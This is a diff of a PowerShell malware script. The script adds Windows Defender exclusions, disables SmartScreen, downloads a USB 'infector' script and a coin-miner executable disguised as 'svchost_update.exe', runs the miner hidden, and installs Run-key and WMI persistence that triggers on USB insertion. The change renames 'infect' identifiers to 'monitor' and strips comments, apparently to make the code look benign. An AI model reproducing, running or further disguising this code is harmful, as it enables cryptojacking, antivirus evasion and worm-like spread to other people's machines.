@@ -1,6 +1,6 @@
 Start-Sleep -Seconds 15
 
-$infectorScriptPath = "C:\Windows\Temp\infect.ps1"
+$monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
@@ -15,7 +15,6 @@ function Is-Admin {
     return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-# Check and add Windows Defender exclusions first
 $maxAttempts = 20
 $delayBetweenChecks = 5
 for ($i = 0; $i -lt $maxAttempts; $i++) {
@@ -26,7 +25,6 @@ for ($i = 0; $i -lt $maxAttempts; $i++) {
             break
         }
     } catch {
-        # Silently continue
     }
     Start-Sleep -Seconds $delayBetweenChecks
 }
@@ -47,7 +45,7 @@ $exclusionsPaths = @(
     "C:\Program Files\Kaspersky Lab",
     "C:\Program Files\Avast Software",
     "C:\Program Files\AVG",
-    $infectorScriptPath
+    $monitorScriptPath
 )
 $exclusionsProcesses = @(
     "svchost_update.exe",
@@ -73,7 +71,6 @@ foreach ($excl in $exclusionsPaths) {
             Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
         }
     } catch {
-        # Silently continue
     }
 }
 foreach ($excl in $exclusionsProcesses) {
@@ -84,7 +81,6 @@ foreach ($excl in $exclusionsProcesses) {
             Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
         }
     } catch {
-        # Silently continue
     }
 }
 foreach ($excl in $exclusionsExtensions) {
@@ -95,11 +91,9 @@ foreach ($excl in $exclusionsExtensions) {
             Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
         }
     } catch {
-        # Silently continue
     }
 }
 
-# Check and disable SmartScreen if not already disabled
 try {
     $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
     $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
@@ -107,21 +101,18 @@ try {
         Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
     }
 } catch {
-    # Silently continue
 }
 
-# Download payloads only after exclusions and SmartScreen
 $retryCount = 3
 
-# Download infector.ps1 if it doesn't exist
-if (-not (Test-Path -Path $infectorScriptPath)) {
+if (-not (Test-Path -Path $monitorScriptPath)) {
     for ($i = 0; $i -lt $retryCount; $i++) {
         try {
-            Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-            if (-not (Test-Path -Path $infectorScriptPath)) {
-                throw "Downloaded infect.ps1 not found at $infectorScriptPath."
+            Invoke-WebRequest -Uri $infectorUrl -OutFile $monitorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+            if (-not (Test-Path -Path $monitorScriptPath)) {
+                throw "Downloaded monitor.ps1 not found at $monitorScriptPath."
             }
-            Unblock-File -Path $infectorScriptPath -ErrorAction Stop
+            Unblock-File -Path $monitorScriptPath -ErrorAction Stop
             break
         } catch {
             Start-Sleep -Seconds 2
@@ -129,7 +120,6 @@ if (-not (Test-Path -Path $infectorScriptPath)) {
     }
 }
 
-# Download svchost_update.exe if it doesn't exist
 if (-not (Test-Path -Path $payloadPath)) {
     for ($i = 0; $i -lt $retryCount; $i++) {
         try {
@@ -145,7 +135,6 @@ if (-not (Test-Path -Path $payloadPath)) {
     }
 }
 
-# Download and extract WindowsServices if it doesn't exist
 if (-not (Test-Path -Path $crackedSoftwareFolder)) {
     for ($i = 0; $i -lt $retryCount; $i++) {
         try {
@@ -165,18 +154,15 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
     }
 }
 
-# Execute svchost_update.exe if it exists
 if (Test-Path -Path $payloadPath) {
     if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
         try {
             Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
         } catch {
-            # Silently continue
         }
     }
 }
 
-# Set up registry persistence
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     $regName = "WindowsUpdateCheck"
@@ -184,7 +170,6 @@ try {
     $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
     $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
     if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
-        # Registry key already configured
     } else {
         if (-not (Test-Path $regPath)) {
             New-Item -Path $regPath -Force | Out-Null
@@ -192,23 +177,16 @@ try {
         Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
     }
 } catch {
-    # Silently continue
 }
 
-# Set up WMI event subscription for USB detection
 try {
     $filterName = "USBInsertionFilter"
-    $consumerName = "USBInfectionConsumer"
-
-    # Check if WMI filter and consumer already exist
+    $consumerName = "USBMonitorConsumer"
     $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
     $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
     $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""
-
     if ($existingFilter -and $existingConsumer -and $existingBinding) {
-        # WMI subscription already exists
     } else {
-        # Remove existing filter, consumer, or binding if they partially exist
         if ($existingBinding) {
             $existingBinding | Remove-WmiObject
         }
@@ -218,8 +196,6 @@ try {
         if ($existingConsumer) {
             $existingConsumer | Remove-WmiObject
         }
-
-        # Create WMI event filter
         $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
         $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
             Name = $filterName
@@ -227,20 +203,15 @@ try {
             QueryLanguage = "WQL"
             Query = $query
         }
-
-        # Create WMI command line consumer
-        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$infectorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
+        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
         $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
             Name = $consumerName
             CommandLineTemplate = $commandLine
         }
-
-        # Bind filter to consumer
         $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
             Filter = $filter
             Consumer = $consumer
         }
     }
 } catch {
-    # Silently continue
 }
